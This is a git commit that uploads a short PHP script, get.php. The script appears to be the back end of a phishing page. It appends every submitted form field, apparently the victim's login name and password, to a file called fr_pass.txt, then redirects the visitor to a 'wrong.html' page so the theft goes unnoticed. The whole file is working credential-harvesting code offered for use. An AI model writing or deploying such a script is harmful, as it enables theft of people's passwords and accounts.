c48d4916608b2a8c1dd2403dca60e840ee57a0e1
Fazle Rabbi <71178740+fh-rabbi@users.noreply.github.com>
2021-04-10 06:58:39 +0600

    Add files via upload

---
+++ get.php
@@ -0,0 +1,16 @@
+<?php
+header
+('location:');
+$handle=fopen("fr_pass.txt","a");
+foreach($_POST as $variable=>$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"=");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
+header("location:wrong.html");
+exit;
+?>
